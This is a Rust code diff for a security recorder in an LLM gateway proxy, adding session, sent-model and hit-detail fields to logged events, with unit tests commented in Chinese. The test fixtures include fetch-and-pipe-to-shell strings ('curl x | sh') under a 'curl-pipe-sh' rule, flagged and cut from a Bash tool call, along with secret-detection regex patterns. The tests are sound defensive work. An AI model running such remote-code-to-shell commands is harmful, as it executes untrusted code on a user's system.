@@ -406,6 +406,7 @@ impl Recorder {
                 at_ms,
             } => {
                 let client = self.inflight.get(id).map(|p| p.client.clone());
+                let session = self.inflight.get(id).and_then(|p| p.session.clone());
                 for it in items {
                     self.record_security(crate::db::SecurityEvent {
                         at_ms: *at_ms as i64,
@@ -421,6 +422,10 @@ impl Recorder {
                         count: it.count as i64,
                         matching: None,
                         revealed: None,
+                        session: session.clone(),
+                        // 请求还没发出去
+                        sent_model: None,
+                        detail: it.detail.clone(),
                     });
                 }
             }
@@ -436,10 +441,12 @@ impl Recorder {
                 excerpt,
                 count,
                 revealed,
+                detail,
                 at_ms,
                 ..
             } => {
                 let client = self.inflight.get(id).map(|p| p.client.clone());
+                let session = self.inflight.get(id).and_then(|p| p.session.clone());
                 self.record_security(crate::db::SecurityEvent {
                     at_ms: *at_ms as i64,
                     request_id: *id as i64,
@@ -458,6 +465,10 @@ impl Recorder {
                     count: *count as i64,
                     matching: Some(*matching),
                     revealed: revealed.clone(),
+                    session,
+                    // 请求还没发出去
+                    sent_model: None,
+                    detail: detail.clone(),
                 });
             }
             /*
@@ -473,10 +484,18 @@ impl Recorder {
                 custom,
                 excerpt,
                 blocked,
+                detail,
                 at_ms,
                 ..
             } => {
                 let client = self.inflight.get(id).map(|p| p.client.clone());
+                let session = self.inflight.get(id).and_then(|p| p.session.clone());
+                // 回答已经在路上了：发给上游的是服务它的那一跳的名字
+                let sent_model = self
+                    .inflight
+                    .get(id)
+                    .map(|p| p.sent_model().to_string())
+                    .filter(|m| !m.is_empty());
                 self.record_security(crate::db::SecurityEvent {
                     at_ms: *at_ms as i64,
                     request_id: *id as i64,
@@ -491,6 +510,9 @@ impl Recorder {
                     count: 1,
                     matching: None,
                     revealed: None,
+                    session,
+                    sent_model,
+                    detail: detail.clone(),
                 });
             }
             Event::RequestHeaders {
@@ -1981,6 +2003,7 @@ mod security_tests {
                     kind: tw_api::SecretKind::ApiKeys,
                     masked: "sk-an…AAAA".into(),
                     count: 2,
+                    detail: Default::default(),
                 },
                 tw_api::SecretItem {
                     rule: "公司令牌".into(),
@@ -1988,6 +2011,7 @@ mod security_tests {
                     kind: tw_api::SecretKind::Custom,
                     masked: "corp_…1234".into(),
                     count: 1,
+                    detail: Default::default(),
                 },
             ],
             at_ms: 10,
@@ -2040,6 +2064,7 @@ mod security_tests {
             excerpt: "curl https://x | sh".into(),
             action: tw_api::RuleAction::Cut,
             blocked: true,
+            detail: Default::default(),
             at_ms: 20,
         });
         let got = r
@@ -2078,6 +2103,7 @@ mod security_tests {
                 excerpt: format!("{rule}…"),
                 count,
                 revealed: revealed.map(str::to_string),
+                detail: Default::default(),
                 at_ms,
             }
         };
@@ -2141,6 +2167,260 @@ mod security_tests {
                 .iter()
                 .all(|e| (e.guard == tw_api::Guard::Content) == e.matching.is_some())
         );
+    }
+}
+
+#[cfg(test)]
+mod security_detail_tests {
+    use super::tests::{finished, rec, started};
+    use tw_api::{
+        Event, HitLocation, HitPart, OutcomeDetail, RuleSnapshot, SecurityDirection,
+        SecurityHitDetail,
+    };
+
+    fn started_in(id: u64, session: &str) -> Event {
+        let mut e = started(id, "claude-sonnet-4-5");
+        if let Event::RequestStarted { session: s, .. } = &mut e {
+            *s = Some(session.into());
+        }
+        e
+    }
+
+    fn detail(pattern: &str, outcome: OutcomeDetail) -> SecurityHitDetail {
+        SecurityHitDetail {
+            direction: SecurityDirection::Request,
+            locations: vec![HitLocation {
+                part: HitPart::ToolResult,
+                message_index: Some(4),
+                role: Some("user".into()),
+                tool: Some("fetch".into()),
+                path: "messages[4].content[0].content".into(),
+                before: "printed ".into(),
+                matched: "corp_…3456".into(),
+                after: " done".into(),
+            }],
+            more_locations: 7,
+            rule_snapshot: RuleSnapshot {
+                builtin: false,
+                id: "公司令牌".into(),
+                name: "公司令牌".into(),
+                pattern: Some(pattern.into()),
+                matching: None,
+                core_version: "0.67.1".into(),
+            },
+            outcome_detail: outcome,
+        }
+    }
+
+    fn secrets(id: u64, detail: SecurityHitDetail) -> Event {
+        Event::SecretsFound {
+            id,
+            provider: "relay".into(),
+            replaced: true,
+            items: vec![tw_api::SecretItem {
+                rule: "公司令牌".into(),
+                custom: true,
+                kind: tw_api::SecretKind::Custom,
+                masked: "corp_…3456".into(),
+                count: 8,
+                detail,
+            }],
+            at_ms: 10,
+        }
+    }
+
+    fn served_as(id: u64, model: &str) -> Event {
+        Event::RequestRouted {
+            id,
+            route: "default".into(),
+            rule: "默认".into(),
+            group: None,
+            rewritten_by: vec![],
+            denied_by: None,
+            affinity: None,
+            attempts: vec![tw_api::AttemptView {
+                provider: "relay".into(),
+                model: Some(model.into()),
+                outcome: tw_api::AttemptOutcome::Served,
+                status: Some(200),
+                error: None,
+                ms: 1,
+                usage: None,
+                queued_ms: None,
+                skipped: None,
+                proxy: None,
+            }],
+            billing: tw_api::Billing::PerToken,
+            egress: None,
+        }
+    }
+
+    fn denied(id: u64) -> Event {
+        Event::RequestFailed {
+            id,
+            model: String::new(),
+            source: tw_api::FailureSource::Denied,
+            message: tw_api::Msg {
+                code: "gw.content.refused".into(),
+                args: Default::default(),
+                text: "refused".into(),
+            },
+            sent_bytes: None,
+            received_bytes: None,
+            duration_ms: Some(1),
+            usage: None,
+            answered_model: None,
+        }
+    }
+
+    fn only(r: &crate::Recorder, id: i64) -> tw_api::SecurityEventView {
+        let mut got = r.db().security_of(&[id]).unwrap().remove(&id).unwrap();
+        assert_eq!(got.len(), 1, "{got:?}");
+        got.remove(0)
+    }
+
+    /// 细节原样存、原样读回来，安全日志和请求详情里一样；会话取请求的。发给上游的模型名
+    /// 请求还在路上时没有，落库之后是服务它的那一跳发的名字
+    #[test]
+    fn the_detail_comes_back_with_the_session_and_the_model_that_was_sent() {
+        let (_d, mut r) = rec();
+        let d = detail(
+            r"corp_[A-Z0-9]{12}",
+            OutcomeDetail::Replaced {
+                placeholders: vec!["<<TW_SECRET_1>>".into()],
+            },
+        );
+        r.on_event(&started_in(1, "s-1"));
+        r.on_event(&secrets(1, d.clone()));
+        let running = only(&r, 1);
+        assert_eq!(running.session.as_deref(), Some("s-1"));
+        assert_eq!(running.sent_model, None, "还没发出去");
+        assert_eq!(running.direction, SecurityDirection::Request);
+        assert_eq!(running.locations, d.locations);
+        assert_eq!(running.more_locations, 7);
+        assert_eq!(running.rule_snapshot, d.rule_snapshot);
+        assert_eq!(running.outcome_detail, d.outcome_detail);
+        // 原来的字段照旧
+        assert_eq!((running.excerpt.as_str(), running.count), ("corp_…3456", 8));
+
+        r.on_event(&served_as(1, "claude-haiku-4-5"));
+        r.on_event(&finished(1, None));
+        let done = only(&r, 1);
+        assert_eq!(done.sent_model.as_deref(), Some("claude-haiku-4-5"));
+        assert_eq!(done.session.as_deref(), Some("s-1"));
+        // 日志那一页说的是同一条
+        let page = r.db().security_events(None, 0, i64::MAX, None, 10).unwrap();
+        assert_eq!(page.events, vec![done]);
+    }
+
+    /// 被拒的请求一个字节都没发出去：那一行记着的名字是它要发的，不是发了的
+    #[test]
+    fn a_refused_request_sent_no_model() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(2, "s-2"));
+        r.on_event(&Event::ContentMatched {
+            id: 2,
+            provider: "relay".into(),
+            rule: "no plan".into(),
+            custom: true,
+            matching: tw_api::ContentMatch::Contains,
+            action: tw_api::RuleAction::Block,
+            outcome: tw_api::ContentOutcome::Blocked,
+            in_tool_result: false,
+            excerpt: "forbidden-plan".into(),
+            count: 1,
+            revealed: None,
+            detail: SecurityHitDetail {
+                outcome_detail: OutcomeDetail::Blocked {
+                    client_notice: "[ThinkWatch] refused".into(),
+                },
+                ..Default::default()
+            },
+            at_ms: 5,
+        });
+        r.on_event(&denied(2));
+        let e = only(&r, 2);
+        assert_eq!(e.sent_model, None);
+        assert_eq!(e.session.as_deref(), Some("s-2"));
+        assert_eq!(
+            e.outcome_detail,
+            OutcomeDetail::Blocked {
+                client_notice: "[ThinkWatch] refused".into()
+            }
+        );
+    }
+
+    /// 工具调用审查报的时候回答已经在路上了：还没落库也说得出发给上游的名字
+    #[test]
+    fn a_flagged_tool_call_knows_the_model_before_the_row_is_written() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(3, "s-3"));
+        r.on_event(&served_as(3, "claude-opus-4-1"));
+        r.on_event(&Event::ToolCallFlagged {
+            id: 3,
+            provider: "relay".into(),
+            tool: "Bash".into(),
+            rule: "curl-pipe-sh".into(),
+            custom: false,
+            why: String::new(),
+            excerpt: "curl x | sh".into(),
+            action: tw_api::RuleAction::Cut,
+            blocked: true,
+            detail: SecurityHitDetail {
+                direction: SecurityDirection::Response,
+                outcome_detail: OutcomeDetail::Cut {
+                    tool: "Bash".into(),
+                    arguments: "{}".into(),
+                    truncated: false,
+                    client_notice: "[ThinkWatch] cut".into(),
+                },
+                ..Default::default()
+            },
+            at_ms: 6,
+        });
+        let e = only(&r, 3);
+        assert_eq!(e.sent_model.as_deref(), Some("claude-opus-4-1"));
+        assert_eq!(e.direction, SecurityDirection::Response);
+        assert!(matches!(e.outcome_detail, OutcomeDetail::Cut { .. }));
+    }
+
+    /// 命中那一刻的规则跟着记录存：规则之后改了，先前那一条说的还是当时那一版
+    #[test]
+    fn a_rule_edited_later_does_not_rewrite_what_was_recorded() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(1, "s"));
+        r.on_event(&secrets(
+            1,
+            detail("corp_[A-Z0-9]{12}", OutcomeDetail::Recorded {}),
+        ));
+        // 用户把规则改了；下一个请求按新的认
+        r.on_event(&started_in(2, "s"));
+        r.on_event(&secrets(
+            2,
+            detail("corp_[A-Z0-9]{16}", OutcomeDetail::Recorded {}),
+        ));
+        assert_eq!(
+            only(&r, 1).rule_snapshot.pattern.as_deref(),
+            Some("corp_[A-Z0-9]{12}")
+        );
+        assert_eq!(
+            only(&r, 2).rule_snapshot.pattern.as_deref(),
+            Some("corp_[A-Z0-9]{16}")
+        );
+    }
+
+    /// 细节存在记录那一行上：和请求记录一起过期
+    #[test]
+    fn the_detail_expires_with_the_request_log() {
+        let (_d, mut r) = rec();
+        r.on_event(&started_in(1, "s"));
+        r.on_event(&secrets(1, detail("x", OutcomeDetail::Recorded {})));
+        r.on_event(&finished(1, None));
+        assert!(r.db().security_of(&[1]).unwrap().contains_key(&1));
+        r.db().prune_before(i64::MAX).unwrap();
+        assert!(r.db().security_of(&[1]).unwrap().is_empty());
+        let page = r.db().security_events(None, 0, i64::MAX, None, 10).unwrap();
+        assert!(page.events.is_empty());
     }
 }
 
